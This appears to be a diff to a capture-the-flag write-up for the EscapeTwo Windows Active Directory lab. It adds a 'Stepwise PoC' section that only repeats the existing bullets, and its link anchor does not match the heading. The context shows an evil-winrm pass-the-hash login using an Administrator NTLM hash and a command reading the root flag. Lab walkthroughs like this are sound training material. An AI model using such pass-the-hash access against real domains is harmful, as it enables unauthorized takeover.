@@ -33,6 +33,7 @@ EscapeTwo is an easy Windows domain machine showcasing a full AD domain takeover
 - [8. ACL Abuse and ADCS Enumeration](#8-acl-abuse-and-adcs-enumeration)
 - [9. Exploiting Vulnerable Certificate Template](#9-exploiting-vulnerable-certificate-template)
 - [10. Domain Admin Access and Root Flag](#10-domain-admin-access-and-root-flag)
+- [11. Stepwise PoC (click to expand)](#10-step-wise-poc)
 
 ---
 
@@ -171,6 +172,13 @@ evil-winrm -i 10.128.124.12 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
+- Use domain admin NTLM hash for pass-the-hash WinRM login.
+- Gain full domain admin shell and capture root flag.
+
+---
+
+## 11. Stepwise PoC (click to expand)
+
 - Use domain admin NTLM hash for pass-the-hash WinRM login.
 - Gain full domain admin shell and capture root flag.
 
